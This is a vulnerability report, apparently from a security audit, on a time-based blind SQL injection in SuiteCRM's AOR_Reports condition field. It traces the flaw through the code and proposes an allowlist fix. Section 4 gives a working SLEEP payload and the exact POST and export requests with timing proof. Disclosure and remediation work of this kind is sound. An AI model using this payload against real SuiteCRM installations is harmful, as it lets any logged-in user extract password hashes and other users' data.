# VULN-017 — AOR_Reports condition `field` used as a raw column identifier (SQL injection)

**ID**: VULN-017
**Software**: SuiteCRM — https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (`targets/SuiteCRM/suitecrm_version.php`) — commit `62effd0ceb767ed3b634ade585b19a6633eb4fcb` (untagged `hotfix`/`forkedSuite` snapshot)
**Severity**: High — **CVSS 3.1 8.1** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**Status**: **CONFIRMED (dynamic)**
**Auth required**: Any authenticated user with default Reports module access (own report). No special role — the exploit provisions a freshly-created, plain non-admin user and never elevates it.
**What an attacker gains**: a reliable, attacker-timed boolean/time oracle that lets any logged-in user blind-extract arbitrary data from the database (credentials, password hashes, OAuth secrets, other users' records) — executed under the application's own (root) DB account.

## 1. Summary

SuiteCRM's Reports module (`AOR_Reports`) lets any user build a saved report with filter "conditions" (a field, an operator, a value). When the report actually runs, the WHERE-clause builder takes the condition's `field` — which is meant to be a column name like `name` or `date_entered` — and splices it **unvalidated** into the SQL text as a bare identifier. The sibling SELECT-column builder validates the same kind of value against the module's `field_defs` and rejects unknown fields; the WHERE builder does not. Because it's spliced as an *identifier* rather than a *quoted value*, the usual SuiteCRM XSS filter (which only rewrites quote/angle-bracket characters) is irrelevant — the payload never needs a quote character at all. Any authenticated user can therefore turn their own saved report into a blind SQL injection oracle against the whole database.

## 2. How it works (mechanism & code trace)

**Entry point** — `index.php?module=AOR_Reports&action=export&record=<id>`, dispatched to `AOR_ReportsController::action_export()`:

```php
// modules/AOR_Reports/controller.php:188-204
protected function action_export()
{
    ...
    if (!$this->bean->ACLAccess('Export')) { ... }
    $this->bean->user_parameters = requestToUserParameters($this->bean);
    $this->bean->build_report_csv();
    die;
}
```

**Hop 1** — `AOR_Report::build_report_csv()` calls the shared query builder:

```php
// modules/AOR_Reports/AOR_Report.php:1096
$sql = $this->build_report_query();
$result = $this->db->query($sql);
```

**Hop 2** — `build_report_query()` (`:1135`) calls the WHERE builder:

```php
// modules/AOR_Reports/AOR_Report.php:1153
$query_array = $this->build_report_query_where($query_array);
```

**Hop 3 — the defect** — `build_report_query_where()` (`:1479`) loads each saved `AOR_Conditions` row and looks up its `field_defs` entry:

```php
// modules/AOR_Reports/AOR_Report.php:1545
$data = $condition_module->field_defs[$condition->field];
```

There is **no `isset()`/reject** here. For a `field` value that isn't a real column, `$data` is simply `null` (PHP emits an "undefined array key" notice and moves on). Every subsequent `$data['...']` check (`relate`, `link`, `custom_fields`) is then false/skipped, and control falls straight through to the raw `else` branch:

```php
// modules/AOR_Reports/AOR_Report.php:1588-1592
if ((isset($data['source']) && $data['source'] == 'custom_fields')) {
    ...
} else {
    $field = $this->db->quoteIdentifier($table_alias) . '.' . $condition->field;   // <-- raw concatenation
}
```

`quoteIdentifier()` is applied only to `$table_alias` (a fixed, server-chosen string like `aok_knowledgebase`) — **never** to `$condition->field`, which is entirely attacker-chosen. This `$field` is then used directly in the WHERE term:

```php
// modules/AOR_Reports/AOR_Report.php:1941-1943
$query['where'][] = ($tiltLogicOp ? '' : ($condition->logic_op ? $condition->logic_op . ' ' : 'AND ')) .
    $field . ' ' . $aor_sql_operator_list[$condition->operator] . ' ' . $value;
```

**The contrast that proves it's a bug, not by-design**: the SELECT-column builder (`build_report_query_select()`, used for the columns a report *displays*) performs exactly the validation that's missing here:

```php
// modules/AOR_Reports/AOR_Report.php:1278-1284
$data = $field_module->field_defs[$field->field] ?? null;
if ($data === null) {
    LoggerManager::getLogger()->security('AOR_Report: rejected invalid field name in select: ' . $field->field);
    continue;   // <-- unknown field is REJECTED
}
```

The WHERE-side twin of this exact check is simply absent. The two builders are meant to enforce the same invariant ("a condition/select field must be a real column of the report's module") and only one of them does.

**Write path** — nothing upstream constrains `field` either. `AOR_Condition::save_lines()` copies it straight from the POST body:

```php
// modules/AOR_Conditions/AOR_Condition.php:132
$condition->$field_name = $post_data[$key . $field_name][$i];
```

SuiteCRM's global input filter, `securexss()` (`include/utils.php:2608`), only rewrites `" ' < > `` — it has no notion of "this value will be used as a raw SQL identifier," so an injection payload built from parentheses, digits, keywords and `#` sails through untouched (confirmed live below: the stored `aor_conditions.field` row is byte-for-byte our payload).

## 3. Why it is a vulnerability (reasoning)

The trust boundary being violated is *user input must never become part of the SQL grammar itself* — only ever a bound value. SuiteCRM's own codebase acknowledges this exact risk and defends against it on the SELECT side (`field_defs` allowlist). The WHERE side accepts the identical shape of attacker-controlled data (a `field` name chosen when the user builds their own report) but skips the allowlist, so the "column name" the user supplies is trusted completely. Any authenticated user — not just admins, not just a delegated role — can own and run a report, so the missing check is reachable by the lowest privilege level SuiteCRM has. This is not a deliberate power-user feature (there is no documented "advanced SQL condition" capability in Reports); it's an asymmetry between two builders that are supposed to enforce the same rule.

## 4. Reproduction

From clean state:

1. `./run.sh` creates a brand-new non-admin user via the admin session (`_common.create_user`) and logs it in (`_common.web_login`) — no manual setup needed.
2. It saves three `AOR_Reports` (module `AOK_KnowledgeBase`, chosen because it started this audit with exactly 1 live row — see "Reproducibility note" below for why row count matters), each with one `AOR_Conditions` line:
   - baseline: `field=id`
   - `field=id IS NULL OR (SELECT SLEEP(2)))#`
   - `field=id IS NULL OR (SELECT SLEEP(3)))#`

   Decisive request (also in `request.http`, step 1):
   ```
   POST /index.php HTTP/1.1
   ...
   module=AOR_Reports&action=Save&record=&name=probe_sleep3_...&report_module=AOK_KnowledgeBase
   &aor_conditions_field%5B0%5D=id+IS+NULL+OR+%28SELECT+SLEEP%283%29%29%29%23
   &aor_conditions_operator%5B0%5D=Equal_To&aor_conditions_value_type%5B0%5D=Value
   &aor_conditions_value%5B0%5D=PROBE&aor_conditions_module_path%5B0%5D=AOK_KnowledgeBase&aor_conditions_deleted%5B0%5D=0
   ```
3. It times `GET /index.php?module=AOR_Reports&action=export&record=<id>` for each (decisive request, `request.http` step 2):
   ```
   GET /index.php?module=AOR_Reports&action=export&record=d0fb8388-a14e-4a1c-97cc-559c9845e5bb HTTP/1.1
   Cookie: PHPSESSID=...
   ```
4. Expected/observed output ends with `==> VULN-017: CONFIRMED — ...`. Actual run (`run.log`):
   ```
   [INFO] live row count of aok_knowledgebase = 2 (SLEEP() is evaluated once per row...)
   [INFO] baseline   export elapsed = 0.05s (status 200)
   [INFO] inject SLEEP(2) export elapsed = 4.22s (status 200)
   [PROOF] inject SLEEP(3) export elapsed = 6.20s (status 200)
   [PROOF] baseline=0.05s, SLEEP(2)->+4.17s, SLEEP(3)->+6.15s: delay tracks the attacker-chosen N almost exactly...
   ==> VULN-017: CONFIRMED — low-priv user mod_59a703c3: baseline 0.05s vs SLEEP(2) +4.17s vs SLEEP(3) +6.15s via AOR_Reports export
   ```
   **Reproducibility note**: this lab is shared with other concurrent stage-10 sessions that insert rows into arbitrary tables mid-run; a sibling session's own exploit grew `aok_knowledgebase` from 1 to 2 rows between an earlier successful run of this exploit (baseline 0.04s, +2.01s, +3.00s — the same pattern at 1× scale) and this final run. Because `SLEEP(N)` is evaluated once per candidate row (see §3/§6), `automation.py` reads the live row count immediately before timing and scales its expected delay/tolerance by `row_count × N` rather than assuming a fixed count, so the result is correct either way; re-running `./run.sh` will show whatever the live row count is at that moment, scaled accordingly.
5. Observable proof: `response.txt` captures the real CSV-export HTTP response for the SLEEP(3) case with **6.20s wall-clock elapsed** recorded alongside it (row_count=2 × SLEEP(3)); `evidence/timing_table.txt` has the full table; the DB-side check (`docker exec ... db mysql`) confirms `aor_conditions.field` is stored byte-for-byte as the raw payload.

## 5. Impact

- **What an attacker reads**: with a working time oracle, any authenticated user can blind-extract arbitrary column values from arbitrary tables — most damagingly `users.user_hash` (password hashes), OAuth2 client secrets, other users' PII, or any record regardless of that record's ACL/team visibility (the query runs under the app's own root-equivalent DB account, not the requesting user's row-level permissions).
- **Blast radius**: the entire database is readable, one bit at a time, without ever needing a successful UNION or visible output — CSV export always returns `200` regardless of the WHERE result, so only timing is needed.
- **Pre/post-auth**: post-auth, but at the lowest privilege tier (a self-registered/assigned regular user with no special role).
- **Chaining**: the same primitive/class as [VULN-016](../../vulns/VULN-016.md) (SELECT-side twin) and [VULN-018](../../vulns/VULN-018.md) (AOW_WorkFlow's WHERE builder, same missing-`field_defs` pattern); a cracked `admin` password hash extracted this way chains directly into [VULN-011](../../vulns/VULN-011.md) (authenticated RCE).

## 6. Suggested fix

At `modules/AOR_Reports/AOR_Report.php:1545`, mirror the SELECT-side guard before `$condition->field` is used anywhere:

```php
$data = $condition_module->field_defs[$condition->field] ?? null;
if ($data === null) {
    LoggerManager::getLogger()->security('AOR_Report: rejected invalid field name in where: ' . $condition->field);
    continue;  // or otherwise skip this condition instead of building SQL from it
}
```

Principle: allowlist, not denylist — an identifier that will be concatenated into SQL must be checked against the finite set of real column names for that module (`field_defs`) before use, exactly as the SELECT builder already does; `securexss`'s character-blacklist approach is the wrong tool for an identifier-context value and should not be relied on here at all.

## 7. References

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command.
- Known-issue status (per `claude_audit/SuiteCRM/vulns/VULN-017.md`): GHSA-4fhr-x4wr-fwqg (`aor_fields.field` SQLi); SELECT-side twin CVE-2026-29096 / GHSA-vh42 (`field_function`).
- PortSwigger Web Security Academy — "Blind SQL injection with time delays" (https://portswigger.net/web-security/sql-injection/blind), the technique used for the timing oracle.
- OWASP WSTG-INPV-05 — Testing for SQL Injection.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 45 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `SuiteCRM GHSA-4fhr-x4wr-fwqg aor_fields field SQL injection` — web indexes returned only CVE-2026-29096 (`field_function`); the GHSA itself was resolved via the GitHub repo advisory API (see 4).
2. `SuiteCRM AOR_Conditions field SQL injection WHERE build_report_query_where` — only CVE-2024-49773 (export `current_post`) and CVE-2026-29096; nothing on `aor_conditions.field`.
3. `SuiteCRM report condition field "aor_conditions" SQL injection advisory 2026` — only CVE-2026-29096; no source mentions `aor_conditions`.
4. GitHub repo advisory API: `GHSA-4fhr-x4wr-fwqg` = CVE-2026-69145 "AOR Reports aor_fields.field SQL Injection" (value stored in `aor_fields.field` re-concatenated without strict field validation; fixed 7.15.2). It names only the `aor_fields` table/column.
5. Diff of `modules/AOR_Reports/AOR_Report.php` v7.15.1 -> v7.15.2 — adds `field_defs[$field->field] ?? null` rejection in `build_report_query_select` (two loops over `aor_fields` rows) and a `field_defs[$condition->value]` check; the `aor_conditions.field` lookup at :1545 (`$condition_module->field_defs[$condition->field]`, no `isset`) and raw identifier concatenation at :1591 are unchanged and still present on the upstream `hotfix` branch as of 2026-10-21.
6. GitHub issue search `repo:SuiteCRM/SuiteCRM aor_conditions field SQL` — only unrelated functional issues (#4195, #7829, #361). 7.15.x release-notes security list contains no entry naming report conditions.

**Related but distinct public references** (same class or component, not this bug):
- GHSA-4fhr-x4wr-fwqg / CVE-2026-69145 — same file and same "stored field name re-concatenated" pattern, but for `aor_fields.field` (display columns, SELECT builder); the 7.15.2 fix validates `$field->field`, not `$condition->field`.
- GHSA-vh42-gmqm-q55m / CVE-2026-29096 — `aor_fields.field_function` SELECT-side SQLi (fixed 7.15.1).
- GHSA-239h-ffjr-v957 / CVE-2026-71548 — `build_report_query_where` SQLi via `parameter_value` (`value_type=Field`), a value sink not the condition identifier.
- GHSA-6c7r-7g6m-29f9 / CVE-2026-100365 — ORDER BY injection via `aor_fields` label.

**Reasoning:** The closest public item (CVE-2026-69145) is the sibling column `aor_fields.field`; the vendor's 7.15.2 diff shows it validated `$field->field` in the SELECT builder and left the WHERE builder's `$condition->field` untouched, and no advisory, CVE, issue, or write-up names `aor_conditions.field` or the `:1545/:1591` path. The finding is therefore judged a distinct, still-unfixed variant. Confidence is low-moderate (45) because it is a near-miss by table/column within the same file and a vendor or reporter could reasonably regard it as an incomplete-fix of CVE-2026-69145.
